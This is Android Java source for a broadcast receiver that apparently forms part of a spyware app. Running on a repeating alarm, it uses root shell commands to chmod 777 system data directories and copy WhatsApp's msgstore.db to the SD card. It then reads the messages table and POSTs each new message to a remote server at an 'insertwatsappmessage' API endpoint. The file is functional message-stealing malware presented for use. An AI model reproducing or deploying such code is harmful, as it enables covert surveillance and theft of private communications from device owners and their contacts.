package voluntaty.com.baseroot;


import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.SQLException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.widget.Toast;

import voluntaty.com.database.DataHelper;
import voluntaty.com.database.DatabaseHelperOne;
import voluntaty.com.database.DatabaseHelperWatsappOne;

import org.apache.http.NameValuePair;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;


public class RepeatingAlarmServiceWatsapp  extends BroadcastReceiver {

    public void setpermission(String path) {
        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("chmod 777 " + path).getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void setmkdir(String path) {
        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("mkdir -p " + path).getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void copyFile() {

        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("cp /data/data/com.whatsapp/databases/msgstore.db /sdcard/copywatsapp").getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    private void copyFile2() {

        try {
            Process shell = Runtime.getRuntime().exec("su", null, new File("/system/bin/"));
            OutputStream os = shell.getOutputStream();

            os.write(("cp /data/data/com.whatsapp/databases/wa.db /sdcard/copywatsapp").getBytes("ASCII"));
            os.flush();
            os.close();
            shell.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    Cursor c = null;

    private DataHelper dh;
    String login=null;
    String email=null;
    String password=null;
    String URL_HTTP=null;

    public static boolean isNetworkConnectedOrConnecting(Context context) {
        final ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        final NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnectedOrConnecting();
    }

    public void onReceive(Context context, Intent intent) {
        if (isNetworkConnectedOrConnecting(context.getApplicationContext())) {
            someTask(context);

     //       Toast.makeText(context," ?????????? start ", Toast.LENGTH_LONG).show();

        }
    }


    void someTask(Context context){

        dh = null;
        dh = new DataHelper(context);

        String serviceswatsapp;
        serviceswatsapp = null;

        serviceswatsapp = dh.selectServiceWatsapp("1");
        dh = null;
        if(serviceswatsapp.length()>0) {

            setpermission("/data");
            setpermission("/data/data");
            setpermission("/data/data/com.whatsapp");
            setpermission("/data/data/com.whatsapp/databases");
            setpermission("/data/data/com.whatsapp/databases/msgstore.db");
        //    setpermission("/data/data/com.whatsapp/databases/wa.db");
       //     Toast.makeText(context," ?????????? start ?????? ", Toast.LENGTH_LONG).show();
          //  setmkdir("/sdcard/copywatsapp");
         //   setpermission("/sdcard/copywatsapp");


            copyFile();
          //  copyFile2();

            dh = null;
            dh = new DataHelper(context);
            URL_HTTP = dh.selectUrl_Http();
            login = dh.selectLogin();
            email = dh.selectEmail();
            password = dh.selectPassword();


            DatabaseHelperWatsappOne myDbHelper = null;
            myDbHelper = new DatabaseHelperWatsappOne(context);
            try {

                myDbHelper.createDataBase();

            } catch (IOException ioe) {

            }

            try {

                myDbHelper.openDataBase();

            } catch (SQLException e) {
            }
            //      Toast.makeText(MainActivity.this, "Success", Toast.LENGTH_SHORT).show();

//            Toast.makeText(context," ?????????? start ?????? ", Toast.LENGTH_LONG).show();

            c = myDbHelper.query("messages", null, null, null, null, null, null);

     //       Toast.makeText(context," ?????????? start ?????? ", Toast.LENGTH_LONG).show();


            if (c.moveToFirst()) {
       //       Toast.makeText(context," ?????????? start ?????? ", Toast.LENGTH_LONG).show();

          do {

                    String idmessage = null;

                    idmessage = dh.selectIWatsappMessage(c.getString(0));
                    int dlina = idmessage.length();

      //        Toast.makeText(context," ?????????? start ?????? ", Toast.LENGTH_LONG).show();



                   if (dlina < 1) {
//                        Toast.makeText(context," ?????????? start ?????? ", Toast.LENGTH_LONG).show();

  //   Toast.makeText(context,URL_HTTP+" "+email+" "+c.getString(1)+" "+c.getString(6)+" "+c.getString(2)+" "+c.getString(7) , Toast.LENGTH_LONG).show();

     new RequestTask().execute(URL_HTTP, email, "" + c.getString(1), "" + c.getString(6),"" + c.getString(2),"" + c.getString(7));
                        //     new RequestTask().execute(URL_HTTP, email, "1111","22222", "3333" , "4444", "5555"ng(9), "" + c.getString(18), "" + c.getString(36));


                        dh.insertWatsappMessage(c.getString(0));
                        //       Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();

                    }

                    idmessage = null;

               } while (c.moveToNext());
            }


 //    Toast.makeText(context," ?????????? start ?????? ", Toast.LENGTH_LONG).show();

            c = null;
            dh = null;
            myDbHelper = null;
            URL_HTTP = null;
            login = null;
            email = null;
            password = null;


        }

        serviceswatsapp = null;


    }

    class RequestTask extends AsyncTask<String, String, String> {
        private String str2=null;

        @Override
        protected String doInBackground(String... params) {

            try {
                // создаем запрос на сервер
                DefaultHttpClient hc = new DefaultHttpClient();
                ResponseHandler<String> res = new BasicResponseHandler();
                // он у нас будет посылать post запрос
                HttpPost postMethod = new HttpPost(params[0]+"/index.php/api/insertwatsappmessage");
                // будем передавать два параметра
                List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(5);
                //0
                nameValuePairs.add(new BasicNameValuePair("email",params[1]));
                nameValuePairs.add(new BasicNameValuePair("keymessage",params[2]));
                nameValuePairs.add(new BasicNameValuePair("message",params[3]));

                nameValuePairs.add(new BasicNameValuePair("flag",params[4]));
                nameValuePairs.add(new BasicNameValuePair("datainsert",params[5]));

                // собераем их вместе и посылаем на сервер
                postMethod.setEntity(new UrlEncodedFormEntity(nameValuePairs,"UTF-8"));
                // получаем ответ от сервера
                String response = hc.execute(postMethod, res);
                //	JSONURL(response.toString());
            } catch (Exception e) {
                System.out.println("Exp=" + e);
            }



            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //dialog.dismiss();
            super.onPostExecute(result);
            // 			Toast.makeText(getApplicationContext()," ?? "+str2, Toast.LENGTH_LONG).show();
        }

        @Override
        protected void onPreExecute() {

            super.onPreExecute();
        }
    }



}
